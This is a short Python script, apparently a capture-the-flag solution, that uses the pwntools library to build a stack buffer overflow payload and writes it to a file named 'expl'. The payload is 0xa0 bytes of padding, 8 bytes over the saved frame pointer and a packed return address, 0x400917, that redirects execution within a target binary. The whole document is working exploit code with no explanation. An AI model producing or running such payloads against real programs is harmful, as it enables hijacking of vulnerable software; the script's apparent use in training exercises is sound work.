from pwn import *

a=b"a"*0xa0+b"A"*8+p64(0x400917)+b"\n"
with open("expl","wb") as f:
    f.write(a)
